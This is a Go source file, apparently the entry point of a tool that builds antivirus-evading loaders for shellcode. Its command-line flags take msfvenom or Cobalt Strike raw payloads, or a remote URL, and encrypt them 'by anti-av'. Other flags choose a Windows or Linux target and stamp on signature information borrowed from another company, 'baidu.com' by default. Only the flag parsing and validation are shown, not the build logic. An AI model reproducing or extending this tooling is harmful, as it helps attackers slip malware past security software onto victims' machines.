package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/sirupsen/logrus"
)

var (
	mAv = config{
		loader: "normal",
	}
)

func main() {
	initialize()
	mAv.build()
}

func initialize() {
	flag.StringVar(&mAv.loader, "l", "binary", "loader: binary")
	flag.StringVar(&mAv.shellcode, "sc", "payload.e", "encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading")
	flag.StringVar(&mAv.os, "os", "windows", "OS: windows,linux")
	flag.StringVar(&mAv.sign, "sign", "baidu.com", "sign infomation")
	flag.BoolVar(&mAv.crypt, "e", false, "encrypt payload")
	flag.Parse()

	if err := mAv.validate(); err != nil {
		logrus.Error(err.Error())
		os.Exit(0)
	}
}

func (c *config) validate() error {
	switch c.loader {
	case "binary":
	default:
		return fmt.Errorf("not Support Loader: %v", c.loader)
	}
	switch c.os {
	case "windows":
	case "linux":
	default:
		return fmt.Errorf("not Support OS: %v", c.os)
	}
	if c.sign == "" {
		logrus.Warn("[-] no Sign Infomation")
	}

	return nil
}
